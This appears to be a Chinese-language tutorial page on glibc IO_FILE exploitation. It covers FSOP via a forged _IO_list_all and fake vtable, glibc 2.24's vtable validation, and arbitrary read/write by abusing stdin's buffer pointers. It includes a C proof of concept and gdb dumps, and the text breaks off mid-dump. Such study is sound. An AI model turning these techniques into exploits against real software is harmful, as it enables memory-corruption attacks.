class="number">0x00007ffff7dd1000</span> <span class="number">0x00000000001c0000</span> r-- /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0x00007ffff7dd1000</span> <span class="number">0x00007ffff7dd3000</span> <span class="number">0x00000000001c4000</span> rw- /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br></pre></td></tr></table></figure>

<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的头部由_IO_list_all 维护。</p>
<p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220720085637881.png" alt="image-20220720085637881"></p>
<p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>
<ol>
<li><p>当 libc 执行 abort 流程时</p>
</li>
<li><p>当执行 exit 函数时</p>
</li>
<li><p>当执行流从 main 函数返回时</p>
</li>
</ol>
<p>梳理一下 FSOP 利用的条件，首先需要攻击者获知 libc.so 基址，因为_IO_list_all 是作为全局变量储存在 libc.so 中的，不泄漏 libc 基址就不能改写_IO_list_all。</p>
<p>之后需要用任意地址写把_IO_list_all 的内容改为指向我们可控内存的指针，</p>
<p>之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的 vtable 指针。但是为了能够让我们构造的 fake_FILE 能够正常工作，还需要布置一些其他数据。 这里的依据是我们前面给出的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>

<p>也就是</p>
<ul>
<li>fp-&gt;_mode &lt;= 0</li>
<li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li>
</ul>
<p>在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的 vtable 和_IO_FILE_plus。 为了绕过验证，我们提前获得了_IO_write_ptr、_IO_write_base、_mode 等数据域的偏移，这样可以在伪造的 vtable 中构造相应的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+vtable_offset)=((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=<span class="number">0x41414141</span>;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(<span class="keyword">long</span> <span class="keyword">long</span> *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用分配内存的前 0x100 个字节作为_IO_FILE，后 0x100 个字节作为 vtable，在 vtable 中使用 0x41414141 这个地址作为伪造的_IO_overflow 指针。</p>
<p>之后，覆盖位于 libc 中的全局变量 _IO_list_all，把它指向我们伪造的_IO_FILE_plus。</p>
<p>通过调用 exit 函数，程序会执行 _IO_flush_all_lockp，经过 fflush 获取_IO_list_all 的值并取出作为_IO_FILE_plus 调用其中的_IO_overflow</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---&gt; call _IO_overflow</span><br><span class="line">[#<span class="number">0</span>] <span class="number">0x7ffff7a89193</span> → Name: _IO_flush_all_lockp(do_lock=<span class="number">0x0</span>)</span><br><span class="line">[#<span class="number">1</span>] <span class="number">0x7ffff7a8932a</span> → Name: _IO_cleanup()</span><br><span class="line">[#<span class="number">2</span>] <span class="number">0x7ffff7a46f9b</span> → Name: __run_exit_handlers(status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=<span class="number">0x1</span>)</span><br><span class="line">[#<span class="number">3</span>] <span class="number">0x7ffff7a47045</span> → Name: __GI_exit(status=&lt;optimized out&gt;)</span><br><span class="line">[#<span class="number">4</span>] <span class="number">0x4005ce</span> → Name: main()</span><br></pre></td></tr></table></figure>

<h3 id="glibc-2-24-下-IO-FILE-的利用"><a href="#glibc-2-24-下-IO-FILE-的利用" class="headerlink" title="glibc 2.24 下 IO_FILE 的利用"></a>glibc 2.24 下 IO_FILE 的利用</h3><p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="keyword">void</span> _IO_vtable_check (<span class="keyword">void</span>) attribute_hidden;</span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">uintptr_t</span> ptr = (<span class="keyword">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - (<span class="keyword">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>计算 <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>，紧接着会判断 vtable - <strong>start_</strong>libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length , 即大于 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 那么就会调用 <code>_IO_vtable_check()</code> 这个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">"Fatal error: glibc detected an invalid stdio handle\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果 vtable 是非法的，那么会引发 abort。</p>
<p>这里的检查使得以往使用 vtable 进行利用的技术很难实现</p>
<h3 id="新的利用技术"><a href="#新的利用技术" class="headerlink" title="新的利用技术"></a>新的利用技术</h3><h4 id="fileno-与缓冲区的相关利用"><a href="#fileno-与缓冲区的相关利用" class="headerlink" title="fileno 与缓冲区的相关利用"></a>fileno 与缓冲区的相关利用</h4><p>在 vtable 难以被利用之后，利用的关注点从 vtable 转移到_IO_FILE 结构内部的域中。 前面介绍过_IO_FILE 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 fwrite、fread 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>因为进程中包含了系统默认的三个文件流 stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf\printf 一样可以进行利用。</p>
<p>在_IO_FILE 中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p>
<p>示例</p>
<p>简单的观察一下_IO_FILE 对于调用 scanf 的作用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">char</span> stack_buf[<span class="number">100</span>];</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%s"</span>,stack_buf);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%s"</span>,stack_buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在执行程序第一次使用 stdin 之前，stdin 的内容还未初始化是空的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:    <span class="number">0x00000000fbad2088</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:    <span class="number">0xffffffffffffffff</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:    <span class="number">0x00007ffff7dd19c0</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7dd06e0</span> &lt;== vtable</span><br></pre></td></tr></table></figure>

<p>调用 scanf 之后可以看到_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end 等域都被初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:    <span class="number">0x00000000fbad2288</span>  <span class="number">0x0000000000602013</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;: <span class="number">0x0000000000602014</span>  <span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;: <span class="number">0x0000000000602010</span>  <span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;: <span class="number">0x0000000000602010</span>  <span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;: <span class="number">0x0000000000602410</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:    <span class="number">0xffffffffffffffff</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:    <span class="number">0x00007ffff7dd19c0</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:    <span class="number">0x00000000ffffffff</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7dd06e0</span></span><br></pre></td></tr></table></figure>

<p>进一步思考可以发现其实 stdin 初始化的内存是在堆上分配出来的，在这里堆的基址是 0x602000，因为之前没有堆分配因此缓冲区的地址也是 0x602010</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Start              End                Offset             Perm Path</span><br><span class="line"><span class="number">0x0000000000400000</span> <span class="number">0x0000000000401000</span> <span class="number">0x0000000000000000</span> r-x /<span class="built_in">home</span>/vb/桌面/tst/<span class="number">1</span>/t1</span><br><span class="line"><span class="number">0x0000000000600000</span> <span class="number">0x0000000000601000</span> <span class="number">0x0000000000000000</span> r-- /<span class="built_in">home</span>/vb/桌面/tst/<span class="number">1</span>/t1</span><br><span class="line"><span class="number">0x0000000000601000</span> <span class="number">0x0000000000602000</span> <span class="number">0x0000000000001000</span> rw- /<span class="built_in">home</span>/vb/桌面/tst/<span class="number">1</span>/t1</span><br><span class="line"><span class="number">0x0000000000602000</span> <span class="number">0x0000000000623000</span> <span class="number">0x0000000000000000</span> rw- [heap]</span><br></pre></td></tr></table></figure>

<p>分配的堆大小是 0x400 个字节，正好对应于_IO_buf_base～_IO_buf_end 在进行写入后，可以看到缓冲区中有我们写入的数据，之后目的地址栈中的缓冲区也会写入数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000411</span> &lt;== 分配<span class="number">0x400</span>大小</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x000000000a333231</span>  <span class="number">0x0000000000000000</span> &lt;== 缓冲数据</span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>接下来我们尝试修改_IO_buf_base 来实现任意地址读写，全局缓冲区 buf 的地址是 0x7ffff7dd2740。修改_IO_buf_base 和_IO_buf_end 到缓冲区 buf 的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:    <span class="number">0x00000000fbad2288</span>  <span class="number">0x0000000000602013</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;: <span class="number">0x0000000000602014</span>  <span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;: <span class="number">0x0000000000602010</span>  <span class="number">0x0000000000602010</span></span><br><span class="line"><span 